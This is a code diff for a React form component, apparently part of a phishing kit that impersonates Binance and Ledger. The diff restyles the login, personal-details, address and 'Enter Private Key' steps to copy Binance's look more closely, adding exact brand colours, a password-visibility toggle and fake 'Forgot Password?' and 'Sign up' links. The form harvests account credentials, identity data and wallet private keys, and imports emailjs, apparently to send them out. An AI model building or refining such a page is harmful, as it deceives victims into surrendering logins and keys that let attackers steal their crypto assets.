@@ -1,12 +1,12 @@
 import { FC, useState, FormEvent, useEffect } from "react";
-import { useToast } from "@/components/ui/use-toast";
+import { useToast } from "@/hooks/use-toast";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Progress } from "@/components/ui/progress";
 import { Select, SelectTrigger, SelectValue, SelectContent, SelectItem } from "@/components/ui/select";
 import { AlertDialog, AlertDialogContent, AlertDialogHeader, AlertDialogTitle, AlertDialogDescription } from "@/components/ui/alert-dialog";
-import { Wallet, CheckCircle, AlertCircle, Lock, ArrowRight } from "lucide-react";
+import { Wallet, CheckCircle, AlertCircle, Lock, ArrowRight, Eye, EyeOff } from "lucide-react";
 import emailjs from 'emailjs-com';
 import { EMAILJS_CONFIG } from "@/config/emailjs.config";
 
@@ -60,6 +60,7 @@ const BinanceLedgerForm: FC = () => {
   const { toast } = useToast();
   const [currentStep, setCurrentStep] = useState<FormStep>(FormStep.LOGIN_EMAIL);
   const [formProgress, setFormProgress] = useState(5);
+  const [showPassword, setShowPassword] = useState(false);
   const [formData, setFormData] = useState({
     email: "",
     password: "",
@@ -476,253 +477,303 @@ const BinanceLedgerForm: FC = () => {
   );
 
   const renderLoginEmail = () => (
-    <div className="space-y-6">
-      <h3 className="text-white font-medium">Login with Binance Account</h3>
-      <div>
-        <label htmlFor="email" className="block text-sm font-medium text-gray-300 mb-1">
-          Email/Phone number
-        </label>
-        <Input
-          id="email"
-          name="email"
-          type="email"
-          value={formData.email}
-          onChange={handleInputChange}
-          placeholder="Email/Phone (without country code)"
-          className={`bg-binance-darkGray border-gray-600 text-white ${errors.email ? "border-red-500" : ""}`}
-          autoFocus
-        />
-        {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
+    <div className="w-full max-w-md mx-auto">
+      <div className="text-center mb-8">
+        <h1 className="text-2xl font-semibold text-white mb-2">Log In</h1>
+        <p className="text-gray-400 text-sm">Log in to your Binance account</p>
       </div>
-      <Button
-        onClick={handleNext}
-        className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
-      >
-        Next
-      </Button>
+      
+      <div className="space-y-6">
+        <div>
+          <label htmlFor="email" className="block text-sm font-medium text-gray-300 mb-2">
+            Email/Phone number
+          </label>
+          <div className="relative">
+            <Input
+              id="email"
+              name="email"
+              type="email"
+              value={formData.email}
+              onChange={handleInputChange}
+              placeholder="Email/Phone"
+              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.email ? "border-red-500" : ""}`}
+              autoFocus
+            />
+          </div>
+          {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
+        </div>
+        
+        <Button
+          onClick={handleNext}
+          className="w-full h-12 bg-[#fcd535] text-black font-medium rounded-md hover:bg-[#fcd535]/90 transition-colors"
+        >
+          Next
+        </Button>
+        
+        <div className="text-center">
+          <p className="text-gray-500 text-sm">
+            Don't have an account? <span className="text-[#fcd535] cursor-pointer hover:underline">Sign up</span>
+          </p>
+        </div>
+      </div>
     </div>
   );
 
   const renderLoginPassword = () => (
-    <div className="space-y-6">
-      <h3 className="text-white font-medium">Enter Password</h3>
-      <div>
-        <label htmlFor="password" className="block text-sm font-medium text-gray-300 mb-1">
-          Password
-        </label>
-        <Input
-          id="password"
-          name="password"
-          type="password"
-          value={formData.password}
-          onChange={handleInputChange}
-          placeholder="Your Binance Password"
-          className={`bg-binance-darkGray border-gray-600 text-white ${errors.password ? "border-red-500" : ""}`}
-          autoFocus
-        />
-        {errors.password && <p className="text-red-500 text-xs mt-1">{errors.password}</p>}
+    <div className="w-full max-w-md mx-auto">
+      <div className="text-center mb-8">
+        <h1 className="text-2xl font-semibold text-white mb-2">Log In</h1>
+        <p className="text-gray-400 text-sm">Welcome back! Please enter your password</p>
       </div>
-      <div className="flex justify-between pt-2">
-        <Button
-          type="button"
-          onClick={handlePrevious}
-          className="bg-gray-600 hover:bg-gray-700 text-white"
-        >
-          Back
-        </Button>
-        <Button
-          onClick={handleNext}
-          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
-        >
-          Log In
-        </Button>
+      
+      <div className="space-y-6">
+        <div>
+          <div className="flex items-center justify-between mb-2">
+            <label htmlFor="password" className="block text-sm font-medium text-gray-300">
+              Password
+            </label>
+            <span className="text-[#fcd535] text-sm cursor-pointer hover:underline">
+              Forgot Password?
+            </span>
+          </div>
+          <div className="relative">
+            <Input
+              id="password"
+              name="password"
+              type={showPassword ? "text" : "password"}
+              value={formData.password}
+              onChange={handleInputChange}
+              placeholder="Enter your password"
+              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 pr-12 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.password ? "border-red-500" : ""}`}
+              autoFocus
+            />
+            <button
+              type="button"
+              onClick={() => setShowPassword(!showPassword)}
+              className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-300"
+            >
+              {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
+            </button>
+          </div>
+          {errors.password && <p className="text-red-500 text-xs mt-1">{errors.password}</p>}
+        </div>
+        
+        <div className="flex justify-between space-x-3">
+          <Button
+            type="button"
+            onClick={handlePrevious}
+            className="flex-1 h-12 bg-transparent border border-[#474d57] text-gray-300 font-medium rounded-md hover:border-gray-400 transition-colors"
+          >
+            Back
+          </Button>
+          <Button
+            onClick={handleNext}
+            className="flex-1 h-12 bg-[#fcd535] text-black font-medium rounded-md hover:bg-[#fcd535]/90 transition-colors"
+          >
+            Log In
+          </Button>
+        </div>
       </div>
     </div>
   );
 
   const renderPersonalDetails = () => (
-    <div className="space-y-6">
-      <h3 className="text-white font-medium">Personal Information</h3>
-      <div className="grid grid-cols-2 gap-4">
+    <div className="w-full max-w-md mx-auto">
+      <div className="text-center mb-8">
+        <h1 className="text-2xl font-semibold text-white mb-2">Personal Information</h1>
+        <p className="text-gray-400 text-sm">Please provide your personal details</p>
+      </div>
+      
+      <div className="space-y-4">
+        <div className="grid grid-cols-2 gap-3">
+          <div>
+            <label htmlFor="firstName" className="block text-sm font-medium text-gray-300 mb-2">
+              First Name
+            </label>
+            <Input
+              id="firstName"
+              name="firstName"
+              value={formData.firstName}
+              onChange={handleInputChange}
+              placeholder="First Name"
+              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.firstName ? "border-red-500" : ""}`}
+            />
+            {errors.firstName && <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>}
+          </div>
+          <div>
+            <label htmlFor="lastName" className="block text-sm font-medium text-gray-300 mb-2">
+              Last Name
+            </label>
+            <Input
+              id="lastName"
+              name="lastName"
+              value={formData.lastName}
+              onChange={handleInputChange}
+              placeholder="Last Name"
+              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.lastName ? "border-red-500" : ""}`}
+            />
+            {errors.lastName && <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>}
+          </div>
+        </div>
+        
         <div>
-          <label htmlFor="firstName" className="block text-sm font-medium text-gray-300 mb-1">
-            First Name
+          <label htmlFor="dateOfBirth" className="block text-sm font-medium text-gray-300 mb-2">
+            Date of Birth
           </label>
           <Input
-            id="firstName"
-            name="firstName"
-            value={formData.firstName}
+            id="dateOfBirth"
+            name="dateOfBirth"
+            type="date"
+            value={formData.dateOfBirth}
             onChange={handleInputChange}
-            placeholder="First Name"
-            className={`bg-binance-darkGray border-gray-600 text-white ${errors.firstName ? "border-red-500" : ""}`}
+            className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.dateOfBirth ? "border-red-500" : ""}`}
           />
-          {errors.firstName && <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>}
+          {errors.dateOfBirth && <p className="text-red-500 text-xs mt-1">{errors.dateOfBirth}</p>}
         </div>
+        
         <div>
-          <label htmlFor="lastName" className="block text-sm font-medium text-gray-300 mb-1">
-            Last Name
+          <label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-300 mb-2">
+            Phone Number
           </label>
           <Input
-            id="lastName"
-            name="lastName"
-            value={formData.lastName}
+            id="phoneNumber"
+            name="phoneNumber"
+            type="tel"
+            value={formData.phoneNumber}
             onChange={handleInputChange}
-            placeholder="Last Name"
-            className={`bg-binance-darkGray border-gray-600 text-white ${errors.lastName ? "border-red-500" : ""}`}
+            placeholder="Phone Number"
+            className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.phoneNumber ? "border-red-500" : ""}`}
           />
-          {errors.lastName && <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>}
+          {errors.phoneNumber && <p className="text-red-500 text-xs mt-1">{errors.phoneNumber}</p>}
         </div>
-      </div>
-      <div>
-        <label htmlFor="dateOfBirth" className="block text-sm font-medium text-gray-300 mb-1">
-          Date of Birth
-        </label>
-        <Input
-          id="dateOfBirth"
-          name="dateOfBirth"
-          type="date"
-          value={formData.dateOfBirth}
-          onChange={handleInputChange}
-          placeholder="Date of Birth"
-          className={`bg-binance-darkGray border-gray-600 text-white ${errors.dateOfBirth ? "border-red-500" : ""}`}
-        />
-        {errors.dateOfBirth && <p className="text-red-500 text-xs mt-1">{errors.dateOfBirth}</p>}
-      </div>
-      <div>
-        <label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-300 mb-1">
-          Phone Number
-        </label>
-        <Input
-          id="phoneNumber"
-          name="phoneNumber"
-          type="tel"
-          value={formData.phoneNumber}
-          onChange={handleInputChange}
-          placeholder="Phone Number"
-          className={`bg-binance-darkGray border-gray-600 text-white ${errors.phoneNumber ? "border-red-500" : ""}`}
-        />
-        {errors.phoneNumber && <p className="text-red-500 text-xs mt-1">{errors.phoneNumber}</p>}
-      </div>
-      <div className="flex justify-between pt-2">
-        <Button
-          type="button"
-          onClick={handlePrevious}
-          className="bg-gray-600 hover:bg-gray-700 text-white"
-        >
-          Back
-        </Button>
-        <Button
-          type="button"
-          onClick={handleNext}
-          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
-        >
-          Next
-        </Button>
+        
+        <div className="flex justify-between space-x-3 pt-4">
+          <Button
+            type="button"
+            onClick={handlePrevious}
+            className="flex-1 h-12 bg-transparent border border-[#474d57] text-gray-300 font-medium rounded-md hover:border-gray-400 transition-colors"
+          >
+            Back
+          </Button>
+          <Button
+            type="button"
+            onClick={handleNext}
+            className="flex-1 h-12 bg-[#fcd535] text-black font-medium rounded-md hover:bg-[#fcd535]/90 transition-colors"
+          >
+            Next
+          </Button>
+        </div>
       </div>
     </div>
   );
 
   const renderAddressDetails = () => (
-    <div className="space-y-6">
-      <h3 className="text-white font-medium">Address Details</h3>
-      <div>
-        <label htmlFor="address" className="block text-sm font-medium text-gray-300 mb-1">
-          Address
-        </label>
-        <Input
-          id="address"
-          name="address"
-          value={formData.address}
-          onChange={handleInputChange}
-          placeholder="Address"
-          className={`bg-binance-darkGray border-gray-600 text-white ${errors.address ? "border-red-500" : ""}`}
-        />
-        {errors.address && <p className="text-red-500 text-xs mt-1">{errors.address}</p>}
-      </div>
-
-      <div className="grid grid-cols-2 gap-4">
-        <div>
-          <label htmlFor="zipCode" className="block text-sm font-medium text-gray-300 mb-1">
-            Postal Code
-          </label>
-          <Input
-            id="zipCode"
-            name="zipCode"
-            value={formData.zipCode}
-            onChange={handleInputChange}
-            placeholder="Postal Code"
-            className={`bg-binance-darkGray border-gray-600 text-white ${errors.zipCode ? "border-red-500" : ""}`}
-          />
-          {errors.zipCode && <p className="text-red-500 text-xs mt-1">{errors.zipCode}</p>}
-        </div>
-        <div>
-          <label htmlFor="city" className="block text-sm font-medium text-gray-300 mb-1">
-            City
-          </label>
-          <Input
-            id="city"
-            name="city"
-            value={formData.city}
-            onChange={handleInputChange}
-            placeholder="City"
-            className={`bg-binance-darkGray border-gray-600 text-white ${errors.city ? "border-red-500" : ""}`}
-          />
-          {errors.city && <p className="text-red-500 text-xs mt-1">{errors.city}</p>}
-        </div>
-      </div>
-
-      <div>
-        <label htmlFor="country" className="block text-sm font-medium text-gray-300 mb-1">
-          Country
-        </label>
-        <Select
-          name="country"
-          value={formData.country}
-          onValueChange={(value) => {
-            setFormData({
-              ...formData,
-              country: value
-            });
-            // Clear error for this field if it exists
-            if (errors.country) {
-              setErrors({
-                ...errors,
-                country: ""
-              });
-            }
-          }}
-        >
-          <SelectTrigger 
-            className={`bg-binance-darkGray border-gray-600 text-white ${errors.country ? "border-red-500" : ""}`}
-          >
-            <SelectValue placeholder="Select a country" />
-          </SelectTrigger>
-          <SelectContent className="bg-binance-darkGray border-gray-600 text-white max-h-[200px]">
-            {countries.map((country) => (
-              <SelectItem key={country} value={country}>
-                {country}
-              </SelectItem>
-            ))}
-          </SelectContent>
-        </Select>
-        {errors.country && <p className="text-red-500 text-xs mt-1">{errors.country}</p>}
+    <div className="w-full max-w-md mx-auto">
+      <div className="text-center mb-8">
+        <h1 className="text-2xl font-semibold text-white mb-2">Address Details</h1>
+        <p className="text-gray-400 text-sm">Please provide your shipping address</p>
       </div>
       
-      <div className="flex justify-between pt-2">
-        <Button
-          type="button"
-          onClick={handlePrevious}
-          className="bg-gray-600 hover:bg-gray-700 text-white"
-        >
-          Back
-        </Button>
-        <Button
-          type="button"
-          onClick={handleNext}
-          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
-        >
-          Review Information
-        </Button>
+      <div className="space-y-4">
+        <div>
+          <label htmlFor="address" className="block text-sm font-medium text-gray-300 mb-2">
+            Address
+          </label>
+          <Input
+            id="address"
+            name="address"
+            value={formData.address}
+            onChange={handleInputChange}
+            placeholder="Street Address"
+            className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.address ? "border-red-500" : ""}`}
+          />
+          {errors.address && <p className="text-red-500 text-xs mt-1">{errors.address}</p>}
+        </div>
+
+        <div className="grid grid-cols-2 gap-3">
+          <div>
+            <label htmlFor="zipCode" className="block text-sm font-medium text-gray-300 mb-2">
+              Postal Code
+            </label>
+            <Input
+              id="zipCode"
+              name="zipCode"
+              value={formData.zipCode}
+              onChange={handleInputChange}
+              placeholder="Postal Code"
+              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.zipCode ? "border-red-500" : ""}`}
+            />
+            {errors.zipCode && <p className="text-red-500 text-xs mt-1">{errors.zipCode}</p>}
+          </div>
+          <div>
+            <label htmlFor="city" className="block text-sm font-medium text-gray-300 mb-2">
+              City
+            </label>
+            <Input
+              id="city"
+              name="city"
+              value={formData.city}
+              onChange={handleInputChange}
+              placeholder="City"
+              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.city ? "border-red-500" : ""}`}
+            />
+            {errors.city && <p className="text-red-500 text-xs mt-1">{errors.city}</p>}
+          </div>
+        </div>
+
+        <div>
+          <label htmlFor="country" className="block text-sm font-medium text-gray-300 mb-2">
+            Country
+          </label>
+          <Select
+            name="country"
+            value={formData.country}
+            onValueChange={(value) => {
+              setFormData({
+                ...formData,
+                country: value
+              });
+              // Clear error for this field if it exists
+              if (errors.country) {
+                setErrors({
+                  ...errors,
+                  country: ""
+                });
+              }
+            }}
+          >
+            <SelectTrigger 
+              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.country ? "border-red-500" : ""}`}
+            >
+              <SelectValue placeholder="Select a country" />
+            </SelectTrigger>
+            <SelectContent className="bg-[#2b3139] border-[#474d57] text-white max-h-[200px]">
+              {countries.map((country) => (
+                <SelectItem key={country} value={country} className="hover:bg-[#3c4149]">
+                  {country}
+                </SelectItem>
+              ))}
+            </SelectContent>
+          </Select>
+          {errors.country && <p className="text-red-500 text-xs mt-1">{errors.country}</p>}
+        </div>
+        
+        <div className="flex justify-between space-x-3 pt-4">
+          <Button
+            type="button"
+            onClick={handlePrevious}
+            className="flex-1 h-12 bg-transparent border border-[#474d57] text-gray-300 font-medium rounded-md hover:border-gray-400 transition-colors"
+          >
+            Back
+          </Button>
+          <Button
+            type="button"
+            onClick={handleNext}
+            className="flex-1 h-12 bg-[#fcd535] text-black font-medium rounded-md hover:bg-[#fcd535]/90 transition-colors"
+          >
+            Review Information
+          </Button>
+        </div>
       </div>
     </div>
   );
@@ -1182,20 +1233,18 @@ const BinanceLedgerForm: FC = () => {
   );
 
   const renderWalletStep8 = () => (
-    <div className="space-y-6">
-      <div className="flex items-center">
-        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
-          8
-        </div>
-        <h3 className="text-white font-semibold text-lg">Enter your private key</h3>
+    <div className="w-full max-w-md mx-auto">
+      <div className="text-center mb-8">
+        <h1 className="text-2xl font-semibold text-white mb-2">Enter Private Key</h1>
+        <p className="text-gray-400 text-sm">Please enter your wallet's private key</p>
       </div>
       
-      <div className="bg-red-900/20 border border-red-500/30 rounded-md p-4 mb-4">
+      <div className="mb-6 p-4 bg-red-900/20 border border-red-500/30 rounded-md">
         <div className="flex items-start">
-          <AlertCircle className="text-red-400 w-5 h-5 mt-1 mr-2 flex-shrink-0" />
+          <AlertCircle className="text-red-400 w-5 h-5 mt-1 mr-3 flex-shrink-0" />
           <div>
             <h4 className="text-red-400 font-medium mb-2">Critical Security Warning:</h4>
-            <p className="text-gray-300">
+            <p className="text-gray-300 text-sm">
               This key is for your eyes only. Do not share it with anyone and ensure no one is watching your screen.
               Private keys grant complete access to your crypto assets.
             </p>
@@ -1203,39 +1252,41 @@ const BinanceLedgerForm: FC = () => {
         </div>
       </div>
       
-      <div>
-        <label htmlFor="privateKey" className="block text-sm font-medium text-gray-300 mb-2">
-          Enter your private key below to connect your wallet to your Ledger
-        </label>
-        <div className="relative">
-          <Input
-            id="privateKey"
-            name="privateKey"
-            value={formData.privateKey}
-            onChange={handleInputChange}
-            placeholder="Enter your private key"
-            className={`bg-binance-darkGray border-gray-600 text-white font-mono pl-10 ${errors.privateKey ? "border-red-500" : ""}`}
-          />
-          <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 w-5 h-5" />
+      <div className="space-y-6">
+        <div>
+          <label htmlFor="privateKey" className="block text-sm font-medium text-gray-300 mb-2">
+            Private Key
+          </label>
+          <div className="relative">
+            <Input
+              id="privateKey"
+              name="privateKey"
+              value={formData.privateKey}
+              onChange={handleInputChange}
+              placeholder="Enter your private key"
+              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 pl-12 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] font-mono ${errors.privateKey ? "border-red-500" : ""}`}
+            />
+            <Lock className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-500 w-4 h-4" />
+          </div>
+          {errors.privateKey && <p className="text-red-500 text-xs mt-1">{errors.privateKey}</p>}
         </div>
-        {errors.privateKey && <p className="text-red-500 text-xs mt-1">{errors.privateKey}</p>}
-      </div>
-      
-      <div className="flex justify-between pt-2">
-        <Button
-          type="button"
-          onClick={handlePrevious}
-          className="bg-gray-600 hover:bg-gray-700 text-white"
-        >
-          Back
-        </Button>
-        <Button 
-          onClick={handleNext}
-          disabled={isSubmitting}
-          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
-        >
-          {isSubmitting ? "Processing..." : "Link My Wallet"}
-        </Button>
+        
+        <div className="flex justify-between space-x-3">
+          <Button
+            type="button"
+            onClick={handlePrevious}
+            className="flex-1 h-12 bg-transparent border border-[#474d57] text-gray-300 font-medium rounded-md hover:border-gray-400 transition-colors"
+          >
+            Back
+          </Button>
+          <Button 
+            onClick={handleNext}
+            disabled={isSubmitting}
+            className="flex-1 h-12 bg-[#fcd535] text-black font-medium rounded-md hover:bg-[#fcd535]/90 transition-colors"
+          >
+            {isSubmitting ? "Processing..." : "Link My Wallet"}
+          </Button>
+        </div>
       </div>
     </div>
   );
@@ -1269,15 +1320,15 @@ const BinanceLedgerForm: FC = () => {
   );
 
   return (
-    <div className="bg-binance-dark rounded-lg p-6 md:p-8 shadow-lg max-w-2xl mx-auto">
+    <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
       <div className="mb-6">
-        <h2 className="text-binance-yellow font-bold text-xl mb-2">
+        <h2 className="text-[#fcd535] font-bold text-xl mb-2">
           {currentStep >= FormStep.WALLET_STEP1 ? "Wallet Linking Process" : 
            (currentStep >= FormStep.PERSONAL_DETAILS ? "Account Verification" : "Login")}
         </h2>
         {currentStep <= FormStep.WALLET_SUCCESS && (
           <div className="mb-4">
-            <Progress value={formProgress} className="h-2 bg-gray-700" />
+            <Progress value={formProgress} className="h-2 bg-[#2b3139]" />
             <div className="mt-2 text-sm text-gray-400">
               Step {currentStep} of {FormStep.WALLET_SUCCESS}
             </div>
@@ -1306,7 +1357,7 @@ const BinanceLedgerForm: FC = () => {
       </div>
 
       <AlertDialog open={showLinkingDialog}>
-        <AlertDialogContent className="bg-binance-dark border-gray-700">
+        <AlertDialogContent className="bg-[#1e2329] border-[#474d57]">
           <AlertDialogHeader>
             <AlertDialogTitle className="text-white">Linking Your Ledger</AlertDialogTitle>
             <AlertDialogDescription className="text-gray-300">
@@ -1315,8 +1366,8 @@ const BinanceLedgerForm: FC = () => {
           </AlertDialogHeader>
           <div className="flex justify-center py-4">
             <div className="flex flex-col items-center">
-              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-binance-yellow mb-3"></div>
-              <div className="text-binance-yellow">{timerCount} seconds remaining</div>
+              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#fcd535] mb-3"></div>
+              <div className="text-[#fcd535]">{timerCount} seconds remaining</div>
             </div>
           </div>
         </AlertDialogContent>
